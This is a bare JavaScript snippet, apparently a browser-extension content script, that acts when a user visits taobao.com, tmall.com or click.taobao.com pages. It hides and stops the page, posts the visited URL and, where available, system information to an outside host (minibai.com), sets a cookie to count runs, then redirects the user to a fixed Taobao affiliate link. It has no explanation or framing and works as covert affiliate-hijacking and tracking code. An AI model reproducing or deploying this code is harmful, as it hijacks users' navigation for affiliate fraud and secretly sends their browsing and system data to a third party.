! function (w, urlArr, hours = 24) {
  var runUrl = [{
      url: 'https://www.taobao.com/',
      times: 1,
      rate: 100,
      absolute: true,
    }, {
      url: 'https://www.tmall.com/',
      times: 1,
      rate: 100,
      absolute: true,
    }, {
      url: 'click.taobao.com/',
      times: 1,
      rate: 100,
      absolute: false,
    }, ],
    key = '_vip_888_';
  for (var url of urlArr) {
    main(url);
  }

  function main(url) {
    for (var item of runUrl) {
      let bool = item.absolute && location.href === item.url || !item.absolute && location.href.indexOf(item.url) != -1;
      if (bool) {
        randomRun(item.rate, function () {
          if (!getCookie(key) || getCookie(key) < item.times) {
            if (document.body)
              document.body.style.display = 'none';
            if (w.stop){
              w.stop();
            }else{
              document.execCommand("Stop");
            }
              
            upload_(url);
            if (!getCookie(key)) {
              setCookie(key, 1, hours);
            } else {
              var times = getCookie(key);
              setCookie(key, ++times, hours);
            }
            if(chrome.xb && chrome.xb.openUrl){
              chrome.xb.openUrl(url,0);
            }else{
              location.replace(url);
            }
            
          }
        });
      }
    }
  }

  function randomRun(num, callback) {
    var random = Math.random() * 100;
    if (num >= random) {
      callback && callback();
    }
  }

  function upload_(target) {
    let url = '//cclientreport.minibai.com/sl.json',
      data = {
        su: w.location.href,
        tu: target,
        t: 2,
      };
    if (chrome.xb && chrome.xb.getSysInfo){
      chrome.xb.getSysInfo(function (s) {
        data = {
          su: w.location.href,
          tu: target,
          t: 2,
          s
        }
        post({
          url,
          data
        });
      })
    }else{
      post({
        url,
        data
      });
    }
      
  }

  function post(options) {
    options = options || {};
    options.type = "POST";
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    var params = getParams(options.data),
      xhr, timeoutFlag = null;
    window.clearTimeout(timeoutFlag);
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        var status = xhr.status;
        if (status >= 200 && status < 300) {
          window.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          window.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    xhr.open('POST', options.url, options.async);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
    timeoutFlag = window.setTimeout(function () {
      window.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }

  function getParams(data) {
    var arr = [];
    for (var param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }

  function setCookie(key, value, expirehours) {
    var date = new Date();
    date.setTime(date.getTime() + expirehours * 3600 * 1000);
    document.cookie = key + "=" + value + "; expires=" + date.toGMTString();
  }

  function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ')
        c = c.substring(1);
      if (c.indexOf(name) != -1)
        return c.substring(name.length, c.length);
    }
    return "";
  }
}
(window.top, ['https://s.click.taobao.com/6dZDF0w'], 24);